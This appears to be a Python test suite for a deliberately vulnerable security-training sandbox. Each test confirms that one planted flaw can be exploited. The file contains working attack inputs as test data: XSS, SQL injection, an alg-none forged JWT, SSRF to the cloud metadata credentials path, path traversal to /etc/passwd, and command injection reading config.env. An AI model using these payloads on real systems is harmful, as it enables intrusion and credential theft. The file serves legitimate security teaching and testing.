"""Каждый тест подтверждает наличие задуманной уязвимости в уровне.

Это не тесты «защищённости» — намеренно. Уровни уязвимы по дизайну,
и тесты фиксируют, что эксплуатация действительно срабатывает.
"""

import base64
import hashlib
import json


async def test_xss_stored_payload_returned_as_is(client, auth_headers):
    payload = '<img src=x onerror="window.levelSuccess()">'
    resp = await client.post(
        "/sandbox/levels/1/comments",
        json={"content": payload},
        headers=auth_headers,
    )
    assert resp.status_code == 200
    assert resp.json()["content"] == payload

    listing = await client.get("/sandbox/levels/1/comments", headers=auth_headers)
    assert payload in listing.json()[0]["content"]


async def test_sqli_or_one_equals_one_returns_all_rows(client, auth_headers):
    benign = await client.get(
        "/sandbox/levels/2/search?username=ivan",
        headers=auth_headers,
    )
    assert benign.status_code == 200
    benign_count = len(benign.json())

    payload = "%' OR '1'='1"
    exploited = await client.get(
        f"/sandbox/levels/2/search?username={payload}",
        headers=auth_headers,
    )
    assert exploited.status_code == 200
    exploited_rows = exploited.json()

    assert len(exploited_rows) > benign_count
    assert any(r["role"] == "admin" for r in exploited_rows)


async def test_idor_allows_reading_other_user_profile(client, auth_headers, idor_profiles_seeded):
    me = await client.get("/sandbox/levels/3/my-profile", headers=auth_headers)
    assert me.status_code == 200
    my_id = me.json()["id"]

    for candidate in range(1, 20):
        if candidate == my_id:
            continue
        resp = await client.get(
            f"/sandbox/levels/3/profile/{candidate}",
            headers=auth_headers,
        )
        if resp.status_code == 200 and resp.json()["role"] == "admin":
            assert resp.json()["secret_note"]
            return
    raise AssertionError("Admin profile was not reachable via IDOR")


def _b64url(data: dict) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


async def test_jwt_alg_none_bypasses_signature(client, auth_headers):
    forged_header = _b64url({"alg": "none", "typ": "JWT"})
    forged_payload = _b64url({"sub": "1", "role": "admin", "portal": "corp-internal"})
    forged_token = f"{forged_header}.{forged_payload}."

    resp = await client.post(
        "/sandbox/levels/4/verify",
        json={"token": forged_token},
        headers=auth_headers,
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["access"] == "granted"
    assert body["role"] == "admin"
    assert body["secret"]


async def test_ssrf_reaches_aws_metadata_endpoint(client, auth_headers):
    resp = await client.post(
        "/sandbox/levels/5/fetch",
        json={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role"},
        headers=auth_headers,
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["secret"] is not None
    assert "SecretAccessKey" in body["content"]


async def test_path_traversal_reads_etc_passwd(client, auth_headers):
    resp = await client.get(
        "/sandbox/levels/6/file?name=../../../../etc/passwd",
        headers=auth_headers,
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["found"] is True
    assert body["traversal"] is True
    assert "root:" in body["content"]


async def test_misconfig_default_admin_credentials_work(client, auth_headers):
    resp = await client.post(
        "/sandbox/levels/7/login",
        json={"username": "admin", "password": "admin"},
        headers=auth_headers,
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["success"] is True
    assert body["role"] == "admin"
    assert body["secret"]


async def test_cryptographic_failures_md5_admin_password_cracked(client, auth_headers):
    """Хеш админа лежит в БД как MD5 без соли — соответствует md5('password')."""
    expected = hashlib.md5(b"password").hexdigest()  # noqa: S324  intentional weak crypto

    users = await client.get("/sandbox/levels/8/users", headers=auth_headers)
    assert users.status_code == 200
    admin_row = next(u for u in users.json() if u["username"] == "admin")
    assert admin_row["password_hash"] == expected

    login = await client.post(
        "/sandbox/levels/8/login",
        json={"username": "admin", "password": "password"},
        headers=auth_headers,
    )
    assert login.status_code == 200
    assert login.json()["success"] is True


async def test_command_injection_reads_config_env(client, auth_headers):
    benign = await client.get(
        "/sandbox/levels/9/ping?host=example.com",
        headers=auth_headers,
    )
    assert benign.json()["injected"] is False

    resp = await client.get(
        "/sandbox/levels/9/ping?host=example.com;cat config.env",
        headers=auth_headers,
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["injected"] is True
    assert "SECRET_KEY" in body["output"]


async def test_csrf_transfer_succeeds_without_csrf_token(client, auth_headers):
    state = await client.get("/sandbox/levels/10/account", headers=auth_headers)
    assert state.status_code == 200
    starting_balance = state.json()["balance"]

    attack = await client.post(
        "/sandbox/levels/10/transfer",
        json={"amount": 500, "to": "attacker@evil.io"},
        headers=auth_headers,
    )
    assert attack.status_code == 200
    body = attack.json()
    assert body["success"] is True
    assert body["balance"] == starting_balance - 500


async def test_supply_chain_typosquat_install_runs_malicious_postinstall(client, auth_headers):
    legit = await client.post(
        "/sandbox/levels/11/install",
        json={"package_name": "chart-lib"},
        headers=auth_headers,
    )
    assert legit.json()["malicious"] is False

    typosquat = await client.post(
        "/sandbox/levels/11/install",
        json={"package_name": "chartlib"},
        headers=auth_headers,
    )
    assert typosquat.status_code == 200
    assert typosquat.json()["malicious"] is True
